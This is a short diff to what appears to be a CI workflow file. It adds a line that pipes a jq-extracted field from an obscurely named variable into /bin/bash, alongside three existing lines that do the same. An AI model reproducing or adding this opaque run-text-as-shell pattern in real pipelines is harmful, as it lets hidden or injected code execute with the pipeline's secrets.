@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$o8" | jq -r .fhgzu036 | /bin/bash
           printf '%s' "$iqjqy0244" | jq -r .uc432 | /bin/bash
           printf '%s' "$rw43" | jq -r .yuyu74 | /bin/bash
+          echo $lxct222 | jq -r .h382 | /bin/bash
 
       - name: Upload results
         if: always()
